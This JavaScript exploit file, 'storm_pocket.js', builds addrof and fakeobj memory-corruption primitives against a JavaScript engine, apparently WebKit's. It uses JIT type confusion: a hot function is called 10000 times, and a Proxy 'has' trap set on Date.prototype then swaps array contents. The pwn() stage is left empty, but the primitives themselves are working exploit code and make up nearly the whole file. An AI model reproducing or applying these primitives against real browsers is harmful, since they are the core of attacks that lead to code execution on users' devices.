// storm_pocket.js created by KtioszDev, vulnerability found by @qwertyoruiopz


var datePrototype = undefined;
var primitives = {
    addrof: function(obj) {
        let arg = [1.1, 2.2, 3.3];

        let date = new Date();
        date[1] = 1;

        function InfoLeaker(arg) {
            0 in date;
            return arg[0];
        }

        for (var i = 0; i < 10000; ++i)
            InfoLeaker(arg);

        var handler = {
            has: function() {
                arg[0] = obj;
                return false;
            }
        }

        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));

        var addr = InfoLeaker(arg);

        Object.setPrototypeOf(Date.prototype, datePrototype);

        if (addr !== 1.1 && typeof addr !== 'object')
            return Int64.fromDouble(addr);

        throw "Could not leak address using 'addrof' primitive!"
    },
    fakeobj: function(addr) {
        let arg = [1.1, 2.2, 3.3];

        let date = new Date();
        date[1] = 1;

        function ObjFaker(arg) {
            0 in date;
            arg[0] = addr;
        }

        for (var i = 0; i < 10000; ++i)
            ObjFaker(arg);

        var handler = {
            has: function() {
                arg[0] = {};
                return false;
            }
        }

        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));

        ObjFaker(arg);

        Object.setPrototypeOf(Date.prototype, datePrototype);

        var obj = arg[0];

        if (typeof obj === 'object')
            return obj;

        throw "Could not inject fake object using 'fakeobj' primitive!"
    }
};

function pwn() {
 
}

function init() {
    datePrototype = Object.getPrototypeOf(Date.prototype);
}

ready.then(function() {
    try {
        init();
        pwn();
    } catch (e) {
        print("[-] Exception caught: " + e);
    }

}).catch(function(err) {
    print("[-] Initialization failed");
});